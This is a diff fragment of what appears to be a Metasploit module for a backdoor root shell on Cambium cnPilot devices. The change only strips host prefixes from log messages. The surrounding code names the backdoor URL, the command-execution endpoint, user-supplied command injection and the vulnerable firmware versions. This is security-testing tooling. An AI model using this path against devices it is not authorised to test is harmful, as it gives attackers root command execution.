@@ -57,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
   def cmd_exec_run(the_cookie)
     # Verify backdoor 'root' shell url exists
     root_shell = (ssl ? 'https' : 'http').to_s + '://' + "#{rhost}:#{rport}" + '/adm/syscmd.asp'
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Checking backdoor 'root' shell...")
+    print_status("Checking backdoor 'root' shell...")
 
     res = send_request_cgi(
       {
@@ -74,8 +74,8 @@ class MetasploitModule < Msf::Auxiliary
     if res && res.code == 200
       uri1 = '/goform/SystemCommand'
       inject_cmd = datastore['CMD']
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - You can access the 'root' shell at: #{root_shell}")
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Executing command - #{inject_cmd}")
+      print_good("You can access the 'root' shell at: #{root_shell}")
+      print_good("Executing command - #{inject_cmd}")
 
       send_request_cgi(
         {
@@ -125,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
         print_good("File saved in: #{p}")
       end
     else
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Backdoor 'root' shell not found. Affected versions are - v4.2.3-R4 and newer. You can try to verify the shell at #{root_shell}")
+      print_error("Backdoor 'root' shell not found. Affected versions are - v4.2.3-R4 and newer. You can try to verify the shell at #{root_shell}")
       return
     end
   end
@@ -141,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
     elsif ['4.2.3-R4', '4.3.1-R1', '4.3.2-R4', '4.3.3-R4'].include?(cnpilot_version.to_s)
       cmd_exec_run(cookie)
     else
-      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - This software version is not vulnerable. Affected versions are - v4.2.3-R4 and newer.")
+      vprint_error("This software version is not vulnerable. Affected versions are - v4.2.3-R4 and newer.")
     end
   end
 end
